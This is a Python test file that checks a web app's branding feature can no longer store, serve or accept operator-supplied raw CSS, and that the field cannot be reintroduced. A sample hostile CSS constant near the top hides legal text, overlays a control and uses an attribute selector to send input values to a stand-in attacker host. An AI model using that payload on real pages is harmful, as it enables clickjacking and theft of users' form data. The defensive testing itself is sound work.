"""Operator-supplied raw CSS is never rendered, served, or stored (ADR-0006 D8).

`OrganizationBranding.custom_css` used to be appended verbatim to the generated
stylesheet and rendered `{{ brand.css | safe }}` on the login page and the
UNAUTHENTICATED careers portal, and served from
`GET /branding/org/{org_id}/css`. CSS alone can hide or rewrite legal/consent
text, overlay destructive controls same-origin, and exfiltrate field contents via
attribute selectors — CSS's intended semantics, which no sanitiser removes.

These tests pin the three properties that close it:

1. stored values are never emitted into generated CSS;
2. no write path accepts a new value;
3. the field cannot be reintroduced into the write schemas or the admin form.

Property 3 is the one that keeps this fixed. 1 and 2 would both pass again the
moment someone re-adds the field "just for power users".
"""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from app.models.finance.core_org.organization_branding import OrganizationBranding
from app.schemas.finance.branding import BrandingCreate, BrandingUpdate
from app.services.finance.branding import CSSGenerator, generate_branding_css

# A payload exercising the three real capabilities, not a toy string: hide legal
# text, overlay a control, and exfiltrate a field value.
HOSTILE_CSS = """
footer, .legal-notice { display: none !important; }
.btn-danger { position: fixed; top: 0; left: 0; z-index: 99999; }
input[value^="a"] { background: url(https://attacker.example/leak?c=a); }
"""


def _branding(**overrides: object) -> OrganizationBranding:
    """An unsaved branding row — CSSGenerator needs no session."""
    defaults: dict[str, object] = {
        "display_name": "Acme",
        "primary_color": "#0d9488",
        "accent_color": "#d97706",
    }
    defaults.update(overrides)
    return OrganizationBranding(**defaults)


# ── 1. Stored values are never emitted ──────────────────────────────────────


def test_generated_css_never_includes_stored_custom_css() -> None:
    css = CSSGenerator(_branding(custom_css=HOSTILE_CSS)).generate()

    assert "display: none" not in css
    assert "attacker.example" not in css
    assert "z-index: 99999" not in css
    # The generated branding itself still works — this is a removal, not a
    # regression of the feature that replaces it.
    assert "--teal:" in css


def test_module_level_generator_also_excludes_it() -> None:
    """`generate_branding_css` is the entry point the service and the public
    `/branding/org/{id}/css` endpoint both use — cover it explicitly rather
    than trusting that it delegates."""
    css = generate_branding_css(_branding(custom_css=HOSTILE_CSS))

    assert "attacker.example" not in css
    assert css  # not empty: real branding is still generated


def test_no_generated_line_is_operator_controlled() -> None:
    """Stronger than a substring check: every emitted declaration must come from
    a generated property, so a future field cannot smuggle raw text back in."""
    css = CSSGenerator(_branding(custom_css=HOSTILE_CSS)).generate()

    for line in css.splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("/*") or stripped in {":root {", "}"}:
            continue
        assert stripped.startswith("--") or stripped.endswith("{") or ":" in stripped, (
            f"unexpected raw line in generated CSS: {stripped!r}"
        )
        assert "attacker.example" not in stripped


# ── 2. No write path accepts a value ────────────────────────────────────────


def test_branding_create_rejects_custom_css() -> None:
    with pytest.raises(ValidationError) as exc:
        BrandingCreate(
            organization_id="00000000-0000-0000-0000-000000000001",
            display_name="Acme",
            custom_css=HOSTILE_CSS,
        )
    # Rejected, not silently ignored — the operator learns it was not stored.
    assert "custom_css" in str(exc.value)


def test_branding_update_rejects_custom_css() -> None:
    with pytest.raises(ValidationError) as exc:
        BrandingUpdate(display_name="Acme", custom_css=HOSTILE_CSS)
    assert "custom_css" in str(exc.value)


def test_write_schemas_still_accept_legitimate_branding() -> None:
    """Sensitivity check on `extra="forbid"`: it must reject the retired field
    without breaking ordinary branding writes."""
    created = BrandingCreate(
        organization_id="00000000-0000-0000-0000-000000000001",
        display_name="Acme",
        primary_color="#0d9488",
    )
    assert created.display_name == "Acme"
    # The hex validator normalises case, so compare case-insensitively.
    assert BrandingUpdate(primary_color="#0d9488").primary_color.lower() == "#0d9488"


# ── 3. The field cannot be reintroduced ─────────────────────────────────────


def test_custom_css_is_absent_from_every_branding_schema() -> None:
    """Covers the response schema too: nothing re-exposes the retired field."""
    from app.schemas.finance import branding as branding_schemas

    offenders = [
        name
        for name in dir(branding_schemas)
        if (cls := getattr(branding_schemas, name, None)) is not None
        and hasattr(cls, "model_fields")
        and "custom_css" in getattr(cls, "model_fields", {})
    ]
    assert not offenders, (
        "custom_css reappeared on branding schema(s): "
        f"{offenders}. Raw CSS is retired (ADR-0006 D8) — add branding fields "
        "or a packaged theme instead."
    )


def test_admin_branding_form_offers_no_raw_css_input() -> None:
    from pathlib import Path

    template = (
        Path(__file__).resolve().parents[2]
        / "templates"
        / "admin"
        / "settings"
        / "branding.html"
    )
    source = template.read_text()
    assert "custom_css" not in source, (
        "the admin branding form references custom_css again — the retired "
        "raw-CSS control must not come back (ADR-0006 D8)"
    )


def test_admin_form_path_never_persists_raw_css() -> None:
    """The admin form path bypasses the pydantic schemas, so it needs its own
    check — this is where the field would most plausibly be re-added.

    Checked precisely rather than by substring: `settings_web.py` legitimately
    mentions `custom_css` in order to REJECT it, so a blunt "not in source"
    assertion would fail on the fix itself. What must stay true is that the
    field never appears in the list of names written onto the model.
    """
    import ast
    from pathlib import Path

    source = (
        Path(__file__).resolve().parents[2]
        / "app"
        / "services"
        / "admin"
        / "settings_web.py"
    ).read_text()

    written_field_lists = [
        [
            element.value
            for element in node.value.elts
            if isinstance(element, ast.Constant) and isinstance(element.value, str)
        ]
        for node in ast.walk(ast.parse(source))
        if isinstance(node, ast.Assign)
        and isinstance(node.value, ast.List)
        and any(
            isinstance(target, ast.Name) and target.id == "branding_fields"
            for target in node.targets
        )
    ]

    assert written_field_lists, "branding_fields list not found — test is stale"
    for fields in written_field_lists:
        assert "custom_css" not in fields, (
            "custom_css is back in settings_web.py's branding_fields — that "
            "list is written onto the model with setattr and bypasses the "
            "schema's extra='forbid' entirely"
        )
